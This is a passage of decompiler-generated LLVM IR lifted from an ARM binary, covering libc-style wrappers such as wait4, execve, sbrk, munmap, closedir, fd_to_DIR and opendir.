  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18dfc, %bb
  %v0_18e04 = phi i32 [ %arg1, %dec_label_pc_18dfc ], [ %v9_18e00, %bb ]
  ret i32 %v0_18e04

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_18e18 = load i32, i32* @r0, align 4
  ret i32 %v0_18e18
}

define i32 @wait4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18e1c = load i32, i32* @r7, align 4
  store i32 %v3_18e1c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18e44, label %dec_label_pc_18e34

dec_label_pc_18e34:                               ; preds = %entry
  %v0_18e34 = call i32 @__GI___errno_location()
  %v0_18e38 = load i32, i32* %r7.global-to-local, align 4
  %v1_18e38 = sub i32 0, %v0_18e38
  %v2_18e3c = inttoptr i32 %v0_18e34 to i32*
  store i32 %v1_18e38, i32* %v2_18e3c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18e48.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18e44

dec_label_pc_18e44:                               ; preds = %entry, %dec_label_pc_18e34
  %v2_18e48 = phi i32 [ %v3_18e1c, %entry ], [ %v2_18e48.pre, %dec_label_pc_18e34 ]
  %v0_18e44 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18e34 ]
  store i32 %v2_18e48, i32* @r7, align 4
  ret i32 %v0_18e44

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18e44, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18e50 = load i32, i32* @r7, align 4
  store i32 %v3_18e50, i32* %stack_var_-8, align 4
  %v0_18e5c = load i32, i32* @r0, align 4
  store i32 %v0_18e5c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18e5c, -4095
  br i1 %tmp, label %dec_label_pc_18e7c, label %dec_label_pc_18e6c

dec_label_pc_18e6c:                               ; preds = %entry
  %v0_18e6c = call i32 @__GI___errno_location()
  %v0_18e70 = load i32, i32* %r7.global-to-local, align 4
  %v1_18e70 = sub i32 0, %v0_18e70
  %v2_18e74 = inttoptr i32 %v0_18e6c to i32*
  store i32 %v1_18e70, i32* %v2_18e74, align 4
  %v2_18e7c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18e7c

dec_label_pc_18e7c:                               ; preds = %entry, %dec_label_pc_18e6c
  %v1_18e80 = phi i32 [ %v0_18e5c, %entry ], [ -1, %dec_label_pc_18e6c ]
  %v2_18e7c = phi i32 [ %v3_18e50, %entry ], [ %v2_18e7c.pre, %dec_label_pc_18e6c ]
  store i32 %v2_18e7c, i32* %r7.global-to-local, align 4
  ret i32 %v1_18e80

; uselistorder directives
  uselistorder i32 %v0_18e5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18e7c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_18e90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 104) to i32*), align 4
  %v1_18e94 = inttoptr i32 %v4_18e90 to i32*
  %v2_18e94 = load i32, i32* %v1_18e94, align 4
  %v2_18e98 = icmp eq i32 %v2_18e94, 0
  br i1 %v2_18e98, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_18ea0 = phi i32 [ %v2_18e94, %entry ], [ 4096, %bb ]
  ret i32 %v1_18ea0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_18ebc = load i32, i32* @r0, align 4
  ret i32 %v1_18ebc
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18ec0 = load i32, i32* @r7, align 4
  store i32 %v3_18ec0, i32* %stack_var_-8, align 4
  %v0_18ecc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18ecc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18ecc, -4095
  br i1 %tmp, label %dec_label_pc_18eec, label %dec_label_pc_18edc

dec_label_pc_18edc:                               ; preds = %entry
  %v0_18edc = call i32 @__GI___errno_location()
  %v0_18ee0 = load i32, i32* %r7.global-to-local, align 4
  %v1_18ee0 = sub i32 0, %v0_18ee0
  %v2_18ee4 = inttoptr i32 %v0_18edc to i32*
  store i32 %v1_18ee0, i32* %v2_18ee4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18eec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18eec

dec_label_pc_18eec:                               ; preds = %entry, %dec_label_pc_18edc
  %v1_18ef0 = phi i32 [ %v0_18ecc, %entry ], [ -1, %dec_label_pc_18edc ]
  %v2_18eec = phi i32 [ %v3_18ec0, %entry ], [ %v2_18eec.pre, %dec_label_pc_18edc ]
  store i32 %v2_18eec, i32* %r7.global-to-local, align 4
  ret i32 %v1_18ef0

; uselistorder directives
  uselistorder i32 %v0_18ecc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18eec, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18ef4 = load i32, i32* @r7, align 4
  store i32 %v3_18ef4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_18f1c, label %dec_label_pc_18f0c

dec_label_pc_18f0c:                               ; preds = %entry
  %v0_18f0c = call i32 @__GI___errno_location()
  %v0_18f10 = load i32, i32* %r7.global-to-local, align 4
  %v1_18f10 = sub i32 0, %v0_18f10
  %v2_18f14 = inttoptr i32 %v0_18f0c to i32*
  store i32 %v1_18f10, i32* %v2_18f14, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_18f20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18f1c

dec_label_pc_18f1c:                               ; preds = %entry, %dec_label_pc_18f0c
  %v2_18f20 = phi i32 [ %v3_18ef4, %entry ], [ %v2_18f20.pre, %dec_label_pc_18f0c ]
  %v0_18f1c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_18f0c ]
  store i32 %v2_18f20, i32* @r7, align 4
  ret i32 %v0_18f1c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18f1c, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_18f38 = load i32, i32* @r0, align 4
  ret i32 %v1_18f38
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18f3c = load i32, i32* @r4, align 4
  store i32 %v3_18f3c, i32* %stack_var_-16, align 4
  store i32 26312, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r4.global-to-local, align 4
  %v4_18f4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 26312) to i32*), align 4
  %v2_18f50 = icmp eq i32 %v4_18f4c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_18f50, label %dec_label_pc_18f5c, label %dec_label_pc_18f6c

dec_label_pc_18f5c:                               ; preds = %entry
  %v1_18f60 = call i32 @__GI_brk(i32 0)
  %v1_18f64 = icmp slt i32 %v1_18f60, 0
  br i1 %v1_18f64, label %dec_label_pc_18f90, label %dec_label_pc_18f6cthread-pre-split

dec_label_pc_18f6cthread-pre-split:               ; preds = %dec_label_pc_18f5c
  %v0_18f70.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_18f6c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_18f6c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18f6c

dec_label_pc_18f6c:                               ; preds = %dec_label_pc_18f6cthread-pre-split, %entry
  %v1_18f6c = phi i32 [ %v1_18f6c.pre, %dec_label_pc_18f6cthread-pre-split ], [ 26312, %entry ]
  %v0_18f6c = phi i32 [ %v0_18f6c.pre, %dec_label_pc_18f6cthread-pre-split ], [ ptrtoint (i16* @global_var_2c158.876 to i32), %entry ]
  %v1_18f80 = phi i32 [ %v0_18f70.pr, %dec_label_pc_18f6cthread-pre-split ], [ %arg1, %entry ]
  %v2_18f6c = add i32 %v0_18f6c, %v1_18f6c
  %v3_18f6c = inttoptr i32 %v2_18f6c to i32*
  %v4_18f6c = load i32, i32* %v3_18f6c, align 4
  %v2_18f70 = icmp eq i32 %v1_18f80, 0
  store i32 %v4_18f6c, i32* %r4.global-to-local, align 4
  br i1 %v2_18f70, label %dec_label_pc_18f94, label %dec_label_pc_18f7c

dec_label_pc_18f7c:                               ; preds = %dec_label_pc_18f6c
  %v2_18f80 = add i32 %v4_18f6c, %v1_18f80
  %v1_18f84 = call i32 @__GI_brk(i32 %v2_18f80)
  %v1_18f88 = icmp slt i32 %v1_18f84, 0
  br i1 %v1_18f88, label %dec_label_pc_18f90, label %dec_label_pc_18f7c.dec_label_pc_18f94_crit_edge

dec_label_pc_18f7c.dec_label_pc_18f94_crit_edge:  ; preds = %dec_label_pc_18f7c
  %v0_18f94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18f90:                               ; preds = %dec_label_pc_18f7c, %dec_label_pc_18f5c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_18f94:                               ; preds = %dec_label_pc_18f6c, %dec_label_pc_18f7c.dec_label_pc_18f94_crit_edge, %dec_label_pc_18f90
  %v0_18f94 = phi i32 [ %v0_18f94.pre, %dec_label_pc_18f7c.dec_label_pc_18f94_crit_edge ], [ -1, %dec_label_pc_18f90 ], [ %v4_18f6c, %dec_label_pc_18f6c ]
  %v2_18f98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18f98, i32* @r4, align 4
  %sext = mul i32 %v0_18f94, 65536
  %v2_18f9c = sdiv i32 %sext, 65536
  ret i32 %v2_18f9c

; uselistorder directives
  uselistorder i32 %v4_18f6c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_18f94, { 2, 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_18fb8 = load i32, i32* @r0, align 4
  ret i32 %v1_18fb8
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18fbc = load i32, i32* @r7, align 4
  store i32 %v3_18fbc, i32* %stack_var_-8, align 4
  %v0_18fc8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18fc8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_18fc8, -4095
  br i1 %tmp, label %dec_label_pc_18fe8, label %dec_label_pc_18fd8

dec_label_pc_18fd8:                               ; preds = %entry
  %v0_18fd8 = call i32 @__GI___errno_location()
  %v0_18fdc = load i32, i32* %r7.global-to-local, align 4
  %v1_18fdc = sub i32 0, %v0_18fdc
  %v2_18fe0 = inttoptr i32 %v0_18fd8 to i32*
  store i32 %v1_18fdc, i32* %v2_18fe0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_18fe8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_18fe8

dec_label_pc_18fe8:                               ; preds = %entry, %dec_label_pc_18fd8
  %v1_18fec = phi i32 [ %v0_18fc8, %entry ], [ -1, %dec_label_pc_18fd8 ]
  %v2_18fe8 = phi i32 [ %v3_18fbc, %entry ], [ %v2_18fe8.pre, %dec_label_pc_18fd8 ]
  store i32 %v2_18fe8, i32* @r7, align 4
  ret i32 %v1_18fec

; uselistorder directives
  uselistorder i32 %v0_18fc8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18fe8, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18ff0 = load i32, i32* @r7, align 4
  store i32 %v3_18ff0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_19018, label %dec_label_pc_19008

dec_label_pc_19008:                               ; preds = %entry
  %v0_19008 = call i32 @__GI___errno_location()
  %v0_1900c = load i32, i32* %r7.global-to-local, align 4
  %v1_1900c = sub i32 0, %v0_1900c
  %v2_19010 = inttoptr i32 %v0_19008 to i32*
  store i32 %v1_1900c, i32* %v2_19010, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1901c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19018

dec_label_pc_19018:                               ; preds = %entry, %dec_label_pc_19008
  %v2_1901c = phi i32 [ %v3_18ff0, %entry ], [ %v2_1901c.pre, %dec_label_pc_19008 ]
  %v0_19018 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_19008 ]
  store i32 %v2_1901c, i32* @r7, align 4
  ret i32 %v0_19018

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19018, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_19024 = load i32, i32* @r7, align 4
  store i32 %v3_19024, i32* %stack_var_-8, align 4
  %v0_19030 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_19030, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_19030, -4095
  br i1 %tmp, label %dec_label_pc_19050, label %dec_label_pc_19040

dec_label_pc_19040:                               ; preds = %entry
  %v0_19040 = call i32 @__GI___errno_location()
  %v0_19044 = load i32, i32* %r7.global-to-local, align 4
  %v1_19044 = sub i32 0, %v0_19044
  %v2_19048 = inttoptr i32 %v0_19040 to i32*
  store i32 %v1_19044, i32* %v2_19048, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_19050.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_19050

dec_label_pc_19050:                               ; preds = %entry, %dec_label_pc_19040
  %v1_19054 = phi i32 [ %v0_19030, %entry ], [ -1, %dec_label_pc_19040 ]
  %v2_19050 = phi i32 [ %v3_19024, %entry ], [ %v2_19050.pre, %dec_label_pc_19040 ]
  store i32 %v2_19050, i32* @r7, align 4
  ret i32 %v1_19054

; uselistorder directives
  uselistorder i32 %v0_19030, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19050, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_19058 = load i32, i32* @r4, align 4
  store i32 %v3_19058, i32* %stack_var_-24, align 4
  %v2_1905c = load i32, i32* %arg1, align 4
  store i32 %v2_1905c, i32* %r4.global-to-local, align 4
  %v3_19064 = icmp eq i32 %v2_1905c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  br i1 %v3_19064, label %dec_label_pc_19078, label %dec_label_pc_1908c

dec_label_pc_19078:                               ; preds = %entry
  %v0_19078 = call i32 @__GI___errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_19080 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_19080, i32* %r2.global-to-local, align 4
  %v2_19084 = inttoptr i32 %v0_19078 to i32*
  store i32 9, i32* %v2_19084, align 4
  %v0_1912c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1912c

dec_label_pc_1908c:                               ; preds = %entry
  store i32 40, i32* %r3.global-to-local, align 4
  %v1_19090 = add i32 %tmp, 24
  store i32 %v1_19090, i32* %r4.global-to-local, align 4
  store i32 %v1_19090, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  %v4_190a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_190a4)
  store i32 -1, i32* @r8, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_190bc = load i32, i32* @r6, align 4
  %v2_190bc = add i32 %v0_190bc, 20
  %v3_190bc = inttoptr i32 %v2_190bc to i32*
  %v4_190bc = load i32, i32* %v3_190bc, align 4
  call void @__pseudo_branch(i32 %v4_190bc)
  %v0_190c8 = load i32, i32* @r7, align 4
  %v1_190c8 = inttoptr i32 %v0_190c8 to i32*
  %v2_190c8 = load i32, i32* %v1_190c8, align 4
  store i32 %v2_190c8, i32* @r4, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_190d8 = load i32, i32* @r8, align 4
  store i32 %v0_190d8, i32* %v1_190c8, align 4
  %v0_190dc = load i32, i32* @r6, align 4
  %v1_190dc = load i32, i32* %r3.global-to-local, align 4
  %v2_190dc = add i32 %v1_190dc, %v0_190dc
  %v3_190dc = inttoptr i32 %v2_190dc to i32*
  %v4_190dc = load i32, i32* %v3_190dc, align 4
  store i32 ptrtoint (i32* @global_var_190e8.1105 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_190dc)
  %v0_190e8 = load i32, i32* @r7, align 4
  %v1_190e8 = add i32 %v0_190e8, 12
  %v2_190e8 = inttoptr i32 %v1_190e8 to i32*
  %v3_190e8 = load i32, i32* %v2_190e8, align 4
  store i32 %v3_190e8, i32* @r0, align 4
  %v0_190ec = call i32 @free()
  %v0_190f0 = load i32, i32* @r7, align 4
  store i32 %v0_190f0, i32* @r0, align 4
  %v0_190f4 = call i32 @free()
  %v0_190fc = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_190fc, -4095
  br i1 %tmp11, label %dec_label_pc_19128, label %dec_label_pc_19118

dec_label_pc_19118:                               ; preds = %dec_label_pc_1908c
  %v0_19118 = call i32 @__GI___errno_location()
  %v0_1911c = load i32, i32* @r4, align 4
  %v1_1911c = sub i32 0, %v0_1911c
  store i32 %v1_1911c, i32* %r3.global-to-local, align 4
  %v2_19120 = inttoptr i32 %v0_19118 to i32*
  store i32 %v1_1911c, i32* %v2_19120, align 4
  %v0_19124 = load i32, i32* @r8, align 4
  br label %dec_label_pc_19128

dec_label_pc_19128:                               ; preds = %dec_label_pc_1908c, %dec_label_pc_19118
  %v0_19128 = phi i32 [ %v0_190fc, %dec_label_pc_1908c ], [ %v0_19124, %dec_label_pc_19118 ]
  store i32 %v0_19128, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1912c

dec_label_pc_1912c:                               ; preds = %dec_label_pc_19078, %dec_label_pc_19128
  %v0_1912c = phi i32 [ %v0_1912c.pre, %dec_label_pc_19078 ], [ %v0_19128, %dec_label_pc_19128 ]
  %v2_19134 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_19134, i32* %r4.global-to-local, align 4
  ret i32 %v0_1912c

; uselistorder directives
  uselistorder i32 %v0_190fc, { 1, 0 }
  uselistorder label %dec_label_pc_1912c, { 1, 0 }
  uselistorder label %dec_label_pc_19128, { 1, 0 }
}

define i32 @function_19140(i32 %arg1) local_unnamed_addr {
dec_label_pc_19140:
  %v0_19140 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19140, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_19140
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_19140, %bb
  %v10_1914c = phi i32 [ %arg1, %dec_label_pc_19140 ], [ 0, %bb ]
  ret i32 %v10_1914c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_19150 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_19164 = call i32 @malloc(i32 48)
  %v2_1916c = icmp eq i32 %v1_19164, 0
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  br i1 %v2_1916c, label %bb, label %dec_label_pc_1917c

bb:                                               ; preds = %entry
  br label %dec_label_pc_19208

dec_label_pc_1917c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19180 = load i32, i32* @r4, align 4
  %v2_19180 = icmp ugt i32 %v0_19180, 511
  %v2_19184 = add i32 %v1_19164, 4
  %v3_19184 = inttoptr i32 %v2_19184 to i32*
  store i32 0, i32* %v3_19184, align 4
  %v0_19188 = load i32, i32* %r3.global-to-local, align 4
  %v2_19188 = add i32 %v1_19164, 16
  %v3_19188 = inttoptr i32 %v2_19188 to i32*
  store i32 %v0_19188, i32* %v3_19188, align 4
  %v0_1918c = load i32, i32* %r3.global-to-local, align 4
  %v2_1918c = add i32 %v1_19164, 8
  %v3_1918c = inttoptr i32 %v2_1918c to i32*
  store i32 %v0_1918c, i32* %v3_1918c, align 4
  br i1 %v2_19180, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_1917c
  %v0_191942 = load i32, i32* @r4, align 4
  %v2_191943 = add i32 %v1_19164, 20
  %v3_191944 = inttoptr i32 %v2_191943 to i32*
  store i32 %v0_191942, i32* %v3_191944, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_1917c
  %v1_19190 = load i32, i32* %r3.global-to-local, align 4
  %v2_19190 = add i32 %v1_19190, 512
  store i32 %v2_19190, i32* %r3.global-to-local, align 4
  %v0_19194 = load i32, i32* @r4, align 4
  %v2_19194 = add i32 %v1_19164, 20
  %v3_19194 = inttoptr i32 %v2_19194 to i32*
  store i32 %v0_19194, i32* %v3_19194, align 4
  %v1_19198 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_19198, i32* %v3_19194, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_19164, i32* @r5, align 4
  %v0_191a0 = load i32, i32* @r7, align 4
  %v2_191a0 = inttoptr i32 %v1_19164 to i32*
  store i32 %v0_191a0, i32* %v2_191a0, align 4
  %v0_191a4 = load i32, i32* @r5, align 4
  %v1_191a4 = add i32 %v0_191a4, 20
  %v2_191a4 = inttoptr i32 %v1_191a4 to i32*
  %v3_191a4 = load i32, i32* %v2_191a4, align 4
  store i32 %v3_191a4, i32* %r1.global-to-local, align 4
  %v2_191ac = call i32 @calloc(i32 1, i32 %v3_191a4)
  %v2_191b0 = icmp eq i32 %v2_191ac, 0
  store i32 %v2_191ac, i32* @r4, align 4
  %v1_191b8 = load i32, i32* @r5, align 4
  %v2_191b8 = add i32 %v1_191b8, 12
  %v3_191b8 = inttoptr i32 %v2_191b8 to i32*
  store i32 %v2_191ac, i32* %v3_191b8, align 4
  br i1 %v2_191b0, label %dec_label_pc_191c0, label %dec_label_pc_191d0

dec_label_pc_191c0:                               ; preds = %bb17
  %v0_191c0 = load i32, i32* @r5, align 4
  store i32 %v0_191c0, i32* @r0, align 4
  %v0_191c4 = call i32 @free()
  %v0_191c8 = load i32, i32* @r4, align 4
  br label %dec_label_pc_19208

dec_label_pc_191d0:                               ; preds = %bb17
  %v0_191d4 = load i32, i32* @r6, align 4
  %v2_191d4 = add i32 %v0_191d4, -33096
  store i32 %v2_191d4, i32* %r3.global-to-local, align 4
  %v1_191dc = inttoptr i32 %v2_191d4 to i32*
  %v2_191dc = load i32, i32* %v1_191dc, align 4
  %v3_191dc = add i32 %v0_191d4, -33092
  %v4_191dc = inttoptr i32 %v3_191dc to i32*
  %v5_191dc = load i32, i32* %v4_191dc, align 4
  store i32 %v5_191dc, i32* %r1.global-to-local, align 4
  %v6_191dc = add i32 %v0_191d4, -33088
  %v7_191dc = inttoptr i32 %v6_191dc to i32*
  %v8_191dc = load i32, i32* %v7_191dc, align 4
  store i32 %v8_191dc, i32* %r2.global-to-local, align 4
  %v9_191dc = add i32 %v0_191d4, -33084
  %v10_191dc = inttoptr i32 %v9_191dc to i32*
  %v11_191dc = load i32, i32* %v10_191dc, align 4
  store i32 %v11_191dc, i32* %r3.global-to-local, align 4
  %v12_191dc = add i32 %v0_191d4, -33080
  %v1_191e8 = inttoptr i32 %v12_191dc to i32*
  %v2_191e8 = load i32, i32* %v1_191e8, align 4
  %v3_191e8 = add i32 %v0_191d4, -33076
  %v4_191e8 = inttoptr i32 %v3_191e8 to i32*
  %v5_191e8 = load i32, i32* %v4_191e8, align 4
  store i32 %v2_191e8, i32* %stack_var_-32, align 4
  store i32 %v5_191dc, i32* %r1.global-to-local, align 4
  store i32 %v8_191dc, i32* %r2.global-to-local, align 4
  store i32 %v11_191dc, i32* %r3.global-to-local, align 4
  %v0_191f8 = load i32, i32* @r5, align 4
  %v1_191f8 = add i32 %v0_191f8, 24
  %v1_191fc = inttoptr i32 %v1_191f8 to i32*
  store i32 %v2_191dc, i32* %v1_191fc, align 4
  %v3_191fc = add i32 %v0_191f8, 28
  %v4_191fc = inttoptr i32 %v3_191fc to i32*
  %v5_191fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_191fc, i32* %v4_191fc, align 4
  %v6_191fc = add i32 %v0_191f8, 32
  %v7_191fc = inttoptr i32 %v6_191fc to i32*
  %v8_191fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_191fc, i32* %v7_191fc, align 4
  %v9_191fc = add i32 %v0_191f8, 36
  %v10_191fc = inttoptr i32 %v9_191fc to i32*
  %v11_191fc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_191fc, i32* %v10_191fc, align 4
  %v12_191fc = add i32 %v0_191f8, 40
  %v2_19200 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_191e8, i32* %r1.global-to-local, align 4
  %v1_19204 = inttoptr i32 %v12_191fc to i32*
  store i32 %v2_19200, i32* %v1_19204, align 4
  %v3_19204 = add i32 %v0_191f8, 44
  %v4_19204 = inttoptr i32 %v3_19204 to i32*
  %v5_19204 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_19204, i32* %v4_19204, align 4
  %v0_19208.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19208

dec_label_pc_19208:                               ; preds = %bb, %dec_label_pc_191c0, %dec_label_pc_191d0
  %v0_19208 = phi i32 [ 0, %bb ], [ %v0_191c8, %dec_label_pc_191c0 ], [ %v0_19208.pre, %dec_label_pc_191d0 ]
  store i32 %v12_19150, i32* @r7, align 4
  ret i32 %v0_19208

; uselistorder directives
  uselistorder i32 %v2_191ac, { 1, 0, 2 }
  uselistorder i32 %v1_19164, { 2, 1, 6, 0, 4, 3, 5, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_19208, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_19228 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_19250, label %dec_label_pc_19240

dec_label_pc_19240:                               ; preds = %entry
  %v0_19240 = call i32 @__GI___errno_location()
  %v0_19244 = load i32, i32* @r7, align 4
  %v1_19244 = sub i32 0, %v0_19244
  %v2_19248 = inttoptr i32 %v0_19240 to i32*
  store i32 %v1_19244, i32* %v2_19248, align 4
  br label %dec_label_pc_19274

dec_label_pc_19250:                               ; preds = %entry
  %v1_19250 = icmp slt i32 %arg1, 0
  br i1 %v1_19250, label %dec_label_pc_19274, label %dec_label_pc_19258

